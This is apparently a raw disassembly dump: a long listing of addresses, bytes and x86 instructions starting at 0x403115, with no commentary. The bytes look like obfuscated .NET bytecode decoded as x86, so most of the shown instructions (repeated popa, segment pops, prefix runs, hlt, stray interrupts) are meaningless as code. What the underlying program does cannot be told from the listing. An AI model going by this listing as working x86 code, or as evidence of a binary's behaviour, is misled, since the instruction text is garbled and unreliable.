  403115:	0a 13                	or     (%ebx),%dl
  403117:	13 11                	adc    (%ecx),%edx
  403119:	08 13                	or     %dl,(%ebx)
  40311b:	1d 11 13 2d 15       	sbb    $0x152d1311,%eax
  403120:	73 60                	jae    0x403182
  403122:	00 00                	add    %al,(%eax)
  403124:	0a 13                	or     (%ebx),%dl
  403126:	12 17                	adc    (%edi),%dl
  403128:	13 1d 11 12 11 1d    	adc    0x1d111211,%ebx
  40312e:	6f                   	outsl  %ds:(%esi),(%dx)
  40312f:	5f                   	pop    %edi
  403130:	00 00                	add    %al,(%eax)
  403132:	0a 13                	or     (%ebx),%dl
  403134:	13 11                	adc    (%ecx),%edx
  403136:	13 2d 03 14 2b 07    	adc    0x72b1403,%ebp
  40313c:	11 13                	adc    %edx,(%ebx)
  40313e:	6f                   	outsl  %ds:(%esi),(%dx)
  40313f:	61                   	popa
  403140:	00 00                	add    %al,(%eax)
  403142:	0a 13                	or     (%ebx),%dl
  403144:	29 7e 0a             	sub    %edi,0xa(%esi)
  403147:	00 00                	add    %al,(%eax)
  403149:	04 11                	add    $0x11,%al
  40314b:	08 06                	or     %al,(%esi)
  40314d:	20 c1                	and    %al,%cl
  40314f:	9f                   	lahf
  403150:	1e                   	push   %ds
  403151:	3e 61                	ds popa
  403153:	07                   	pop    %es
  403154:	58                   	pop    %eax
  403155:	58                   	pop    %eax
  403156:	61                   	popa
  403157:	80 0a 00             	orb    $0x0,(%edx)
  40315a:	00 04 11             	add    %al,(%ecx,%edx,1)
  40315d:	29 2d 03 14 2b 07    	sub    %ebp,0x72b1403
  403163:	11 29                	adc    %ebp,(%ecx)
  403165:	6f                   	outsl  %ds:(%esi),(%dx)
  403166:	62 00                	bound  %eax,(%eax)
  403168:	00 0a                	add    %cl,(%edx)
  40316a:	13 2f                	adc    (%edi),%ebp
  40316c:	11 13                	adc    %edx,(%ebx)
  40316e:	2d 14 7e 0a 00       	sub    $0xa7e14,%eax
  403173:	00 04 20             	add    %al,(%eax,%eiz,1)
  403176:	f4                   	hlt
  403177:	d5 f1                	aad    $0xf1
  403179:	cd 06                	int    $0x6
  40317b:	59                   	pop    %ecx
  40317c:	07                   	pop    %es
  40317d:	59                   	pop    %ecx
  40317e:	61                   	popa
  40317f:	80 0a 00             	orb    $0x0,(%edx)
  403182:	00 04 11             	add    %al,(%ecx,%edx,1)
  403185:	2f                   	das
  403186:	d0 4c 00 00          	rorb   $1,0x0(%eax,%eax,1)
  40318a:	01 28                	add    %ebp,(%eax)
  40318c:	63 00                	arpl   %eax,(%eax)
  40318e:	00 0a                	add    %cl,(%edx)
  403190:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  403194:	0a 13                	or     (%ebx),%dl
  403196:	0f 7e 0a             	movd   %mm1,(%edx)
  403199:	00 00                	add    %al,(%eax)
  40319b:	04 20                	add    $0x20,%al
  40319d:	e1 9f                	loope  0x40313e
  40319f:	1e                   	push   %ds
  4031a0:	3e 06                	ds push %es
  4031a2:	61                   	popa
  4031a3:	07                   	pop    %es
  4031a4:	58                   	pop    %eax
  4031a5:	61                   	popa
  4031a6:	80 0a 00             	orb    $0x0,(%edx)
  4031a9:	00 04 11             	add    %al,(%ecx,%edx,1)
  4031ac:	0f 2d 32             	cvtps2pi (%edx),%mm6
  4031af:	11 2f                	adc    %ebp,(%edi)
  4031b1:	14 28                	adc    $0x28,%al
  4031b3:	64 00 00             	add    %al,%fs:(%eax)
  4031b6:	0a 13                	or     (%ebx),%dl
  4031b8:	0f 11 0f             	movups %xmm1,(%edi)
  4031bb:	2c 24                	sub    $0x24,%al
  4031bd:	11 12                	adc    %edx,(%edx)
  4031bf:	11 1d 28 1d 00 00    	adc    %ebx,0x1d28
  4031c5:	06                   	push   %es
  4031c6:	2c 05                	sub    $0x5,%al
  4031c8:	16                   	push   %ss
  4031c9:	13 0f                	adc    (%edi),%ecx
  4031cb:	2b 14 7e             	sub    (%esi,%edi,2),%edx
  4031ce:	0a 00                	or     (%eax),%al
  4031d0:	00 04 06             	add    %al,(%esi,%eax,1)
  4031d3:	20 42 b9             	and    %al,-0x47(%edx)
  4031d6:	e2 3e                	loop   0x403216
  4031d8:	58                   	pop    %eax
  4031d9:	07                   	pop    %es
  4031da:	59                   	pop    %ecx
  4031db:	61                   	popa
  4031dc:	80 0a 00             	orb    $0x0,(%edx)
  4031df:	00 04 11             	add    %al,(%ecx,%edx,1)
  4031e2:	0f 11 12             	movups %xmm2,(%edx)
  4031e5:	14 fe                	adc    $0xfe,%al
  4031e7:	03 33                	add    (%ebx),%esi
  4031e9:	0d 7e 0a 00 00       	or     $0xa7e,%eax
  4031ee:	04 1f                	add    $0x1f,%al
  4031f0:	20 61 80             	and    %ah,-0x80(%ecx)
  4031f3:	0a 00                	or     (%eax),%al
  4031f5:	00 04 7e             	add    %al,(%esi,%edi,2)
  4031f8:	0a 00                	or     (%eax),%al
  4031fa:	00 04 20             	add    %al,(%eax,%eiz,1)
  4031fd:	27                   	daa
  4031fe:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4031ff:	1e                   	push   %ds
  403200:	3e 06                	ds push %es
  403202:	61                   	popa
  403203:	07                   	pop    %es
  403204:	58                   	pop    %eax
  403205:	11 08                	adc    %ecx,(%eax)
  403207:	17                   	pop    %ss
  403208:	58                   	pop    %eax
  403209:	60                   	pusha
  40320a:	61                   	popa
  40320b:	80 0a 00             	orb    $0x0,(%edx)
  40320e:	00 04 11             	add    %al,(%ecx,%edx,1)
  403211:	3c 73                	cmp    $0x73,%al
  403213:	1f                   	pop    %ds
  403214:	00 00                	add    %al,(%eax)
  403216:	06                   	push   %es
  403217:	80 0e 00             	orb    $0x0,(%esi)
  40321a:	00 04 7e             	add    %al,(%esi,%edi,2)
  40321d:	0e                   	push   %cs
  40321e:	00 00                	add    %al,(%eax)
  403220:	04 6f                	add    $0x6f,%al
  403222:	21 00                	and    %eax,(%eax)
  403224:	00 06                	add    %al,(%esi)
  403226:	20 db                	and    %bl,%bl
  403228:	0c df                	or     $0xdf,%al
  40322a:	3e 06                	ds push %es
  40322c:	58                   	pop    %eax
  40322d:	07                   	pop    %es
  40322e:	61                   	popa
  40322f:	66 66 65 66 65 66 65 	data16 data16 gs data16 gs data16 gs gs data16 gs pushw $0x6861
  403236:	65 66 66 65 68 61 68 
  40323d:	13 26                	adc    (%esi),%esp
  40323f:	11 26                	adc    %esp,(%esi)
  403241:	2d 26 7e 0e 00       	sub    $0xe7e26,%eax
  403246:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403249:	21 00                	and    %eax,(%eax)
  40324b:	00 06                	add    %al,(%esi)
  40324d:	20 2b                	and    %ch,(%ebx)
  40324f:	88 20                	mov    %ah,(%eax)
  403251:	c1 06 59             	roll   $0x59,(%esi)
  403254:	07                   	pop    %es
  403255:	58                   	pop    %eax
  403256:	66 65 66 65 66 65 66 	data16 gs data16 gs data16 gs data16 gs pushw $0x6861
  40325d:	66 65 68 61 68 
  403262:	80 09 00             	orb    $0x0,(%ecx)
  403265:	00 04 2b             	add    %al,(%ebx,%ebp,1)
  403268:	11 7e 0e             	adc    %edi,0xe(%esi)
  40326b:	00 00                	add    %al,(%eax)
  40326d:	04 11                	add    $0x11,%al
  40326f:	26 6f                	outsl  %es:(%esi),(%dx)
  403271:	26 00 00             	add    %al,%es:(%eax)
  403274:	06                   	push   %es
  403275:	80 0f 00             	orb    $0x0,(%edi)
  403278:	00 04 11             	add    %al,(%ecx,%edx,1)
  40327b:	27                   	daa
  40327c:	13 25 11 25 28 1b    	adc    0x1b282511,%esp
  403282:	00 00                	add    %al,(%eax)
  403284:	06                   	push   %es
  403285:	13 32                	adc    (%edx),%esi
  403287:	11 32                	adc    %esi,(%edx)
  403289:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  40328c:	00 06                	add    %al,(%esi)
  40328e:	80 10 00             	adcb   $0x0,(%eax)
  403291:	00 04 7e             	add    %al,(%esi,%edi,2)
  403294:	0d 00 00 04 0c       	or     $0xc040000,%eax
  403299:	08 20                	or     %ah,(%eax)
  40329b:	a3 e2 aa ed 06       	mov    %eax,0x6edaae2
  4032a0:	61                   	popa
  4032a1:	07                   	pop    %es
  4032a2:	59                   	pop    %ecx
  4032a3:	61                   	popa
  4032a4:	0c 16                	or     $0x16,%al
  4032a6:	80 0d 00 00 04 28 46 	orb    $0x46,0x28040000
  4032ad:	00 00                	add    %al,(%eax)
  4032af:	06                   	push   %es
  4032b0:	13 37                	adc    (%edi),%esi
  4032b2:	08 11                	or     %dl,(%ecx)
  4032b4:	37                   	aaa
  4032b5:	6d                   	insl   (%dx),%es:(%edi)
  4032b6:	61                   	popa
  4032b7:	0c 08                	or     $0x8,%al
  4032b9:	20 d4                	and    %dl,%ah
  4032bb:	99                   	cltd
  4032bc:	fb                   	sti
  4032bd:	0c 06                	or     $0x6,%al
  4032bf:	59                   	pop    %ecx
  4032c0:	07                   	pop    %es
  4032c1:	61                   	popa
  4032c2:	61                   	popa
  4032c3:	0c 08                	or     $0x8,%al
  4032c5:	13 35 11 35 13 11    	adc    0x11133511,%esi
  4032cb:	16                   	push   %ss
  4032cc:	13 22                	adc    (%edx),%esp
  4032ce:	11 11                	adc    %edx,(%ecx)
  4032d0:	13 34 20             	adc    (%eax,%eiz,1),%esi
  4032d3:	4f                   	dec    %edi
  4032d4:	9f                   	lahf
  4032d5:	1e                   	push   %ds
  4032d6:	3e 06                	ds push %es
  4032d8:	61                   	popa
  4032d9:	07                   	pop    %es
  4032da:	60                   	pusha
  4032db:	73 01                	jae    0x4032de
  4032dd:	00 00                	add    %al,(%eax)
  4032df:	06                   	push   %es
  4032e0:	25 11 34 7d 06       	and    $0x67d3411,%eax
  4032e5:	00 00                	add    %al,(%eax)
  4032e7:	04 6f                	add    $0x6f,%al
  4032e9:	03 00                	add    (%eax),%eax
  4032eb:	00 0a                	add    %cl,(%edx)
  4032ed:	13 18                	adc    (%eax),%ebx
  4032ef:	2b 1c 11             	sub    (%ecx,%edx,1),%ebx
  4032f2:	18 6f 02             	sbb    %ch,0x2(%edi)
  4032f5:	00 00                	add    %al,(%eax)
  4032f7:	0a 13                	or     (%ebx),%dl
  4032f9:	36 11 11             	adc    %edx,%ss:(%ecx)
  4032fc:	11 36                	adc    %esi,(%esi)
  4032fe:	11 22                	adc    %esp,(%edx)
  403300:	59                   	pop    %ecx
  403301:	61                   	popa
  403302:	13 11                	adc    (%ecx),%edx
  403304:	11 22                	adc    %esp,(%edx)
  403306:	11 11                	adc    %edx,(%ecx)
  403308:	17                   	pop    %ss
  403309:	63 58 13             	arpl   %ebx,0x13(%eax)
  40330c:	22 11                	and    (%ecx),%dl
  40330e:	18 6f 3c             	sbb    %ch,0x3c(%edi)
  403311:	00 00                	add    %al,(%eax)
  403313:	06                   	push   %es
  403314:	2d db de 0c 11       	sub    $0x110cdedb,%eax
  403319:	18 2c 07             	sbb    %ch,(%edi,%eax,1)
  40331c:	11 18                	adc    %ebx,(%eax)
  40331e:	6f                   	outsl  %ds:(%esi),(%dx)
  40331f:	3b 00                	cmp    (%eax),%eax
  403321:	00 06                	add    %al,(%esi)
  403323:	dc 11                	fcoml  (%ecx)
  403325:	11 13                	adc    %edx,(%ebx)
  403327:	40                   	inc    %eax
  403328:	11 40 20             	adc    %eax,0x20(%eax)
  40332b:	9e                   	sahf
  40332c:	88 ee                	mov    %ch,%dh
  40332e:	cd 06                	int    $0x6
  403330:	59                   	pop    %ecx
  403331:	07                   	pop    %es
  403332:	61                   	popa
  403333:	5a                   	pop    %edx
  403334:	06                   	push   %es
  403335:	20 bc d0 c7 3c 61 07 	and    %bh,0x7613cc7(%eax,%edx,8)
  40333c:	58                   	pop    %eax
  40333d:	5d                   	pop    %ebp
  40333e:	13 3e                	adc    (%esi),%edi
  403340:	08 20                	or     %ah,(%eax)
  403342:	83 88 2b c1 06 59 07 	orl    $0x7,0x5906c12b(%eax)
  403349:	58                   	pop    %eax
  40334a:	06                   	push   %es
  40334b:	20 7f 9e             	and    %bh,-0x62(%edi)
  40334e:	1e                   	push   %ds
  40334f:	3e 61                	ds popa
  403351:	07                   	pop    %es
  403352:	61                   	popa
  403353:	66 65 66 65 66 66 65 	data16 gs data16 gs data16 data16 gs data16 gs gs pop %ax
  40335a:	66 65 66 65 58 
  40335f:	61                   	popa
  403360:	0c 06                	or     $0x6,%al
  403362:	20 cc                	and    %cl,%ah
  403364:	0e                   	push   %cs
  403365:	78 0e                	js     0x403375
  403367:	58                   	pop    %eax
  403368:	07                   	pop    %es
  403369:	61                   	popa
  40336a:	11 3e                	adc    %edi,(%esi)
  40336c:	61                   	popa
  40336d:	13 3d 08 20 70 d9    	adc    0xd9702008,%edi
  403373:	65 51                	gs push %ecx
  403375:	06                   	push   %es
  403376:	59                   	pop    %ecx
  403377:	07                   	pop    %es
  403378:	59                   	pop    %ecx
  403379:	66 65 66 65 66 65 66 	data16 gs data16 gs data16 gs data16 gs popaw
  403380:	66 65 61 
  403383:	0c 11                	or     $0x11,%al
  403385:	3d 08 58 0c 08       	cmp    $0x80c5808,%eax
  40338a:	80 0b 00             	orb    $0x0,(%ebx)
  40338d:	00 04 7e             	add    %al,(%esi,%edi,2)
  403390:	0a 00                	or     (%eax),%al
  403392:	00 04 06             	add    %al,(%esi,%eax,1)
  403395:	20 31                	and    %dh,(%ecx)
  403397:	82 11 42             	adcb   $0x42,(%ecx)
  40339a:	58                   	pop    %eax
  40339b:	07                   	pop    %es
  40339c:	58                   	pop    %eax
  40339d:	5f                   	pop    %edi
  40339e:	20 c5                	and    %al,%ch
  4033a0:	97                   	xchg   %eax,%edi
  4033a1:	ee                   	out    %al,(%dx)
  4033a2:	cd 06                	int    $0x6
  4033a4:	59                   	pop    %ecx
  4033a5:	07                   	pop    %es
  4033a6:	59                   	pop    %ecx
  4033a7:	61                   	popa
  4033a8:	80 0a 00             	orb    $0x0,(%edx)
  4033ab:	00 04 7e             	add    %al,(%esi,%edi,2)
  4033ae:	11 00                	adc    %eax,(%eax)
  4033b0:	00 04 20             	add    %al,(%eax,%eiz,1)
  4033b3:	ac                   	lods   %ds:(%esi),%al
  4033b4:	82 11 32             	adcb   $0x32,(%ecx)
  4033b7:	06                   	push   %es
  4033b8:	58                   	pop    %eax
  4033b9:	07                   	pop    %es
  4033ba:	58                   	pop    %eax
  4033bb:	66 65 66 65 66 66 65 	data16 gs data16 gs data16 data16 gs gs pop %di
  4033c2:	65 66 5f 
  4033c5:	2d 16 20 0b cb       	sub    $0xcb0b2016,%eax
  4033ca:	e1 c1                	loope  0x40338d
  4033cc:	06                   	push   %es
  4033cd:	61                   	popa
  4033ce:	07                   	pop    %es
  4033cf:	61                   	popa
  4033d0:	80 0a 00             	orb    $0x0,(%edx)
  4033d3:	00 04 2b             	add    %al,(%ebx,%ebp,1)
  4033d6:	06                   	push   %es
  4033d7:	7e 0b                	jle    0x4033e4
  4033d9:	00 00                	add    %al,(%eax)
  4033db:	04 0c                	add    $0xc,%al
  4033dd:	7e 0a                	jle    0x4033e9
  4033df:	00 00                	add    %al,(%eax)
  4033e1:	04 06                	add    $0x6,%al
  4033e3:	20 79 2e             	and    %bh,0x2e(%ecx)
  4033e6:	12 32                	adc    (%edx),%dh
  4033e8:	58                   	pop    %eax
  4033e9:	07                   	pop    %es
  4033ea:	58                   	pop    %eax
  4033eb:	33 3a                	xor    (%edx),%edi
  4033ed:	19 8d 09 00 00 01    	sbb    %ecx,0x1000009(%ebp)
  4033f3:	13 15 11 15 16 20    	adc    0x20161511,%edx
  4033f9:	e9 7c ee cd 06       	jmp    0x70e227a
  4033fe:	59                   	pop    %ecx
  4033ff:	07                   	pop    %es
  403400:	61                   	popa
  403401:	9d                   	popf
  403402:	11 15 17 1f 30 9d    	adc    %edx,0x9d301f17
  403408:	11 15 18 20 07 61    	adc    %edx,0x61072018
  40340e:	df 3e                	fistpll (%esi)
  403410:	06                   	push   %es
  403411:	58                   	pop    %eax
  403412:	07                   	pop    %es
  403413:	59                   	pop    %ecx
  403414:	9d                   	popf
  403415:	11 15 73 6b 00 00    	adc    %edx,0x6b73
  40341b:	0a 13                	or     (%ebx),%dl
  40341d:	04 11                	add    $0x11,%al
  40341f:	04 13                	add    $0x13,%al
  403421:	3f                   	aas
  403422:	dd 01                	fldl   (%ecx)
  403424:	04 00                	add    $0x0,%al
  403426:	00 02                	add    %al,(%edx)
  403428:	06                   	push   %es
  403429:	20 c9                	and    %cl,%cl
  40342b:	f4                   	hlt
  40342c:	7b b1                	jnp    0x4033df
  40342e:	61                   	popa
  40342f:	07                   	pop    %es
  403430:	58                   	pop    %eax
  403431:	61                   	popa
  403432:	08 61 13             	or     %ah,0x13(%ecx)
  403435:	0e                   	push   %cs
  403436:	11 0e                	adc    %ecx,(%esi)
  403438:	20 04 97             	and    %al,(%edi,%edx,4)
  40343b:	cf                   	iret
  40343c:	a8 06                	test   $0x6,%al
  40343e:	58                   	pop    %eax
  40343f:	07                   	pop    %es
  403440:	61                   	popa
  403441:	61                   	popa
  403442:	13 0e                	adc    (%esi),%ecx
  403444:	7e 0e                	jle    0x403454
  403446:	00 00                	add    %al,(%eax)
  403448:	04 6f                	add    $0x6f,%al
  40344a:	20 00                	and    %al,(%eax)
  40344c:	00 06                	add    %al,(%esi)
  40344e:	11 0e                	adc    %ecx,(%esi)
  403450:	6a 6f                	push   $0x6f
  403452:	6c                   	insb   (%dx),%es:(%edi)
  403453:	00 00                	add    %al,(%eax)
  403455:	0a 7e 0f             	or     0xf(%esi),%bh
  403458:	00 00                	add    %al,(%eax)
  40345a:	04 2c                	add    $0x2c,%al
  40345c:	09 7e 0f             	or     %edi,0xf(%esi)
  40345f:	00 00                	add    %al,(%eax)
  403461:	04 13                	add    $0x13,%al
  403463:	10 2b                	adc    %ch,(%ebx)
  403465:	73 7e                	jae    0x4034e5
  403467:	09 00                	or     %eax,(%eax)
  403469:	00 04 15 33 1c 7e 0e 	add    %al,0xe7e1c33(,%edx,1)
  403470:	00 00                	add    %al,(%eax)
  403472:	04 6f                	add    $0x6f,%al
  403474:	21 00                	and    %eax,(%eax)
  403476:	00 06                	add    %al,(%esi)
  403478:	06                   	push   %es
  403479:	20 a7 06 e1 c1 61    	and    %ah,0x61c1e106(%edi)
  40347f:	07                   	pop    %es
  403480:	59                   	pop    %ecx
  403481:	61                   	popa
  403482:	11 0e                	adc    %ecx,(%esi)
  403484:	61                   	popa
  403485:	68 13 21 2b 07       	push   $0x72b2113
  40348a:	7e 09                	jle    0x403495
  40348c:	00 00                	add    %al,(%eax)
  40348e:	04 13                	add    $0x13,%al
  403490:	21 11                	and    %edx,(%ecx)
  403492:	21 2d 05 14 13 10    	and    %ebp,0x10131405
  403498:	2b 3f                	sub    (%edi),%edi
  40349a:	7e 0e                	jle    0x4034aa
  40349c:	00 00                	add    %al,(%eax)
  40349e:	04 11                	add    $0x11,%al
  4034a0:	21 6f 26             	and    %ebp,0x26(%edi)
  4034a3:	00 00                	add    %al,(%eax)
  4034a5:	06                   	push   %es
  4034a6:	13 10                	adc    (%eax),%edx
  4034a8:	16                   	push   %ss
  4034a9:	13 14 2b             	adc    (%ebx,%ebp,1),%edx
  4034ac:	24 11                	and    $0x11,%al
  4034ae:	10 11                	adc    %dl,(%ecx)
  4034b0:	14 8f                	adc    $0x8f,%al
  4034b2:	08 00                	or     %al,(%eax)
  4034b4:	00 01                	add    %al,(%ecx)
  4034b6:	25 47 7e 0b 00       	and    $0xb7e47,%eax
  4034bb:	00 04 19             	add    %al,(%ecx,%ebx,1)
  4034be:	11 14 5f             	adc    %edx,(%edi,%ebx,2)
  4034c1:	19 62 1f             	sbb    %esp,0x1f(%edx)
  4034c4:	1f                   	pop    %ds
  4034c5:	5f                   	pop    %edi
  4034c6:	63 d2                	arpl   %edx,%edx
  4034c8:	61                   	popa
  4034c9:	d2 52 17             	rclb   %cl,0x17(%edx)
  4034cc:	11 14 58             	adc    %edx,(%eax,%ebx,2)
  4034cf:	13 14 11             	adc    (%ecx,%edx,1),%edx
  4034d2:	14 11                	adc    $0x11,%al
  4034d4:	10 8e 69 33 d4 7e    	adc    %cl,0x7ed43369(%esi)
  4034da:	0e                   	push   %cs
  4034db:	00 00                	add    %al,(%eax)
  4034dd:	04 6f                	add    $0x6f,%al
  4034df:	22 00                	and    (%eax),%al
  4034e1:	00 06                	add    %al,(%esi)
  4034e3:	11 0e                	adc    %ecx,(%esi)
  4034e5:	61                   	popa
  4034e6:	06                   	push   %es
  4034e7:	20 c9                	and    %cl,%cl
  4034e9:	d3 e6                	shl    %cl,%esi
  4034eb:	51                   	push   %ecx
  4034ec:	58                   	pop    %eax
  4034ed:	07                   	pop    %es
  4034ee:	58                   	pop    %eax
  4034ef:	66 66 65 65 66 66 65 	data16 data16 gs gs data16 data16 gs gs popaw
  4034f6:	66 65 61 
  4034f9:	08 61 13             	or     %ah,0x13(%ecx)
  4034fc:	07                   	pop    %es
  4034fd:	11 07                	adc    %eax,(%edi)
  4034ff:	20 4f 9f             	and    %cl,-0x61(%edi)
  403502:	20 c1                	and    %al,%cl
  403504:	06                   	push   %es
  403505:	59                   	pop    %ecx
  403506:	07                   	pop    %es
  403507:	60                   	pusha
  403508:	33 43 7e             	xor    0x7e(%ebx),%eax
  40350b:	0e                   	push   %cs
  40350c:	00 00                	add    %al,(%eax)
  40350e:	04 1a                	add    $0x1a,%al
  403510:	6f                   	outsl  %ds:(%esi),(%dx)
  403511:	26 00 00             	add    %al,%es:(%eax)
  403514:	06                   	push   %es
  403515:	13 1b                	adc    (%ebx),%ebx
  403517:	06                   	push   %es
  403518:	20 46 ce             	and    %al,-0x32(%esi)
  40351b:	cb                   	lret
  40351c:	21 61 07             	and    %esp,0x7(%ecx)
  40351f:	61                   	popa
  403520:	08 61 fe             	or     %ah,-0x2(%ecx)
  403523:	0b 00                	or     (%eax),%eax
  403525:	00 11                	add    %dl,(%ecx)
  403527:	1b 18                	sbb    (%eax),%ebx
  403529:	91                   	xchg   %eax,%ecx
  40352a:	11 1b                	adc    %ebx,(%ebx)
  40352c:	19 91 1f 10 62 60    	sbb    %edx,0x6062101f(%ecx)
  403532:	11 1b                	adc    %ebx,(%ebx)
  403534:	16                   	push   %ss
  403535:	91                   	xchg   %eax,%ecx
  403536:	1e                   	push   %ds
  403537:	62 60 11             	bound  %esp,0x11(%eax)
  40353a:	1b 17                	sbb    (%edi),%edx
  40353c:	91                   	xchg   %eax,%ecx
  40353d:	1f                   	pop    %ds
  40353e:	18 62 60             	sbb    %ah,0x60(%edx)
  403541:	02 65 61             	add    0x61(%ebp),%ah
  403544:	fe 0b                	decb   (%ebx)
  403546:	00 00                	add    %al,(%eax)
  403548:	dd a2 fa ff ff 20    	frstor 0x20fffffa(%edx)
  40354e:	35 e9 f7 3e 06       	xor    $0x63ef7e9,%eax
  403553:	58                   	pop    %eax
  403554:	07                   	pop    %es
  403555:	59                   	pop    %ecx
  403556:	13 17                	adc    (%edi),%edx
  403558:	7e 0a                	jle    0x403564
  40355a:	00 00                	add    %al,(%eax)
  40355c:	04 13                	add    $0x13,%al
  40355e:	2e 11 07             	adc    %eax,%cs:(%edi)
  403561:	13 1e                	adc    (%esi),%ebx
  403563:	11 2e                	adc    %ebp,(%esi)
  403565:	1f                   	pop    %ds
  403566:	0c 59                	or     $0x59,%al
  403568:	13 0a                	adc    (%edx),%ecx
  40356a:	11 07                	adc    %eax,(%edi)
  40356c:	20 50 9f             	and    %dl,-0x61(%eax)
  40356f:	20 d1                	and    %dl,%cl
  403571:	06                   	push   %es
  403572:	59                   	pop    %ecx
  403573:	07                   	pop    %es
  403574:	60                   	pusha
  403575:	5f                   	pop    %edi
  403576:	13 07                	adc    (%edi),%eax
  403578:	7e 0e                	jle    0x403588
  40357a:	00 00                	add    %al,(%eax)
  40357c:	04 11                	add    $0x11,%al
  40357e:	07                   	pop    %es
  40357f:	6f                   	outsl  %ds:(%esi),(%dx)
  403580:	26 00 00             	add    %al,%es:(%eax)
  403583:	06                   	push   %es
  403584:	13 05 7e 10 00 00    	adc    0x107e,%eax
  40358a:	04 13                	add    $0x13,%al
  40358c:	24 de                	and    $0xde,%al
  40358e:	0c 11                	or     $0x11,%al
  403590:	3a 2c 07             	cmp    (%edi,%eax,1),%ch
  403593:	11 2a                	adc    %ebp,(%edx)
  403595:	28 6d 00             	sub    %ch,0x0(%ebp)
  403598:	00 0a                	add    %cl,(%edx)
  40359a:	dc 11                	fcoml  (%ecx)
  40359c:	1e                   	push   %ds
  40359d:	06                   	push   %es
  40359e:	20 bf 82 11 52 58    	and    %bh,0x58521182(%edi)
  4035a4:	07                   	pop    %es
  4035a5:	58                   	pop    %eax
  4035a6:	5f                   	pop    %edi
  4035a7:	16                   	push   %ss
  4035a8:	fe 03                	incb   (%ebx)
  4035aa:	13 31                	adc    (%ecx),%esi
  4035ac:	11 1e                	adc    %ebx,(%esi)
  4035ae:	20 b1 60 e1 81 06    	and    %dh,0x681e160(%ecx)
  4035b4:	61                   	popa
  4035b5:	07                   	pop    %es
  4035b6:	59                   	pop    %ecx
  4035b7:	5f                   	pop    %edi
  4035b8:	16                   	push   %ss
  4035b9:	fe 03                	incb   (%ebx)
  4035bb:	13 3b                	adc    (%ebx),%edi
  4035bd:	11 1e                	adc    %ebx,(%esi)
  4035bf:	20 bf 82 11 b2 06    	and    %bh,0x6b21182(%edi)
  4035c5:	58                   	pop    %eax
  4035c6:	07                   	pop    %es
  4035c7:	58                   	pop    %eax
  4035c8:	5f                   	pop    %edi
  4035c9:	16                   	push   %ss
  4035ca:	fe 03                	incb   (%ebx)
  4035cc:	13 38                	adc    (%eax),%edi
  4035ce:	11 10                	adc    %edx,(%eax)
  4035d0:	11 05 13 19 13 1f    	adc    %eax,0x1f131913
  4035d6:	11 1f                	adc    %ebx,(%edi)
  4035d8:	17                   	pop    %ss
  4035d9:	91                   	xchg   %eax,%ecx
  4035da:	13 30                	adc    (%eax),%esi
  4035dc:	11 19                	adc    %ebx,(%ecx)
  4035de:	8e 69 13             	mov    0x13(%ecx),%gs
  4035e1:	2c 11                	sub    $0x11,%al
  4035e3:	2c 1f                	sub    $0x1f,%al
  4035e5:	0b 58 1d             	or     0x1d(%eax),%ebx
  4035e8:	11 30                	adc    %esi,(%eax)
  4035ea:	58                   	pop    %eax
  4035eb:	61                   	popa
  4035ec:	d2 13                	rclb   %cl,(%ebx)
  4035ee:	23 11                	and    (%ecx),%edx
  4035f0:	1f                   	pop    %ds
  4035f1:	16                   	push   %ss
  4035f2:	91                   	xchg   %eax,%ecx
  4035f3:	11 1f                	adc    %ebx,(%edi)
  4035f5:	18 91 1e 62 60 11    	sbb    %dl,0x1160621e(%ecx)
  4035fb:	23 19                	and    (%ecx),%ebx
  4035fd:	62 58 13             	bound  %ebx,0x13(%eax)
  403600:	20 16                	and    %dl,(%esi)
  403602:	13 16                	adc    (%esi),%edx
  403604:	16                   	push   %ss
  403605:	13 0b                	adc    (%ebx),%ecx
  403607:	2b 56 17             	sub    0x17(%esi),%edx
  40360a:	11 0b                	adc    %ecx,(%ebx)
  40360c:	5f                   	pop    %edi
  40360d:	2d 20 11 20 20       	sub    $0x20201120,%eax
  403612:	bc bc ed c1 06       	mov    $0x6c1edbc,%esp
  403617:	61                   	popa
  403618:	07                   	pop    %es
  403619:	59                   	pop    %ecx
  40361a:	5a                   	pop    %edx
  40361b:	20 14 3e             	and    %dl,(%esi,%edi,1)
  40361e:	47                   	inc    %edi
  40361f:	c1 06 59             	roll   $0x59,(%esi)
  403622:	07                   	pop    %es
  403623:	58                   	pop    %eax
  403624:	58                   	pop    %eax
  403625:	13 20                	adc    (%eax),%esp
  403627:	11 20                	adc    %esp,(%eax)
  403629:	1f                   	pop    %ds
  40362a:	10 64 d1 13          	adc    %ah,0x13(%ecx,%edx,8)
  40362e:	16                   	push   %ss
  40362f:	11 16                	adc    %edx,(%esi)
  403631:	d2 13                	rclb   %cl,(%ebx)
  403633:	39 11                	cmp    %edx,(%ecx)
  403635:	16                   	push   %ss
  403636:	1e                   	push   %ds
  403637:	63 d1                	arpl   %edx,%ecx
  403639:	13 16                	adc    (%esi),%edx
  40363b:	11 19                	adc    %ebx,(%ecx)
  40363d:	11 0b                	adc    %ecx,(%ebx)
  40363f:	91                   	xchg   %eax,%ecx
  403640:	13 2b                	adc    (%ebx),%ebp
  403642:	11 19                	adc    %ebx,(%ecx)
  403644:	11 0b                	adc    %ecx,(%ebx)
  403646:	11 30                	adc    %esi,(%eax)
  403648:	11 2b                	adc    %ebp,(%ebx)
  40364a:	61                   	popa
  40364b:	19 11                	sbb    %edx,(%ecx)
  40364d:	23 58 61             	and    0x61(%eax),%ebx
  403650:	11 39                	adc    %edi,(%ecx)
  403652:	61                   	popa
  403653:	d2 9c 11 0b 17 58 13 	rcrb   %cl,0x1358170b(%ecx,%edx,1)
  40365a:	0b 11                	or     (%ecx),%edx
  40365c:	2b 13                	sub    (%ebx),%edx
  40365e:	23 11                	and    (%ecx),%edx
  403660:	0b 11                	or     (%ecx),%edx
  403662:	2c 32                	sub    $0x32,%al
  403664:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403665:	11 19                	adc    %ebx,(%ecx)
  403667:	13 05 11 24 14 fe    	adc    0xfe142411,%eax
  40366d:	03 11                	add    (%ecx),%edx
  40366f:	17                   	pop    %ss
  403670:	11 2e                	adc    %ebp,(%esi)
  403672:	fe 01                	incb   (%ecx)
  403674:	16                   	push   %ss
  403675:	fe 01                	incb   (%ecx)
  403677:	2e 34 16             	cs xor $0x16,%al
  40367a:	13 09                	adc    (%ecx),%ecx
  40367c:	2b 29                	sub    (%ecx),%ebp
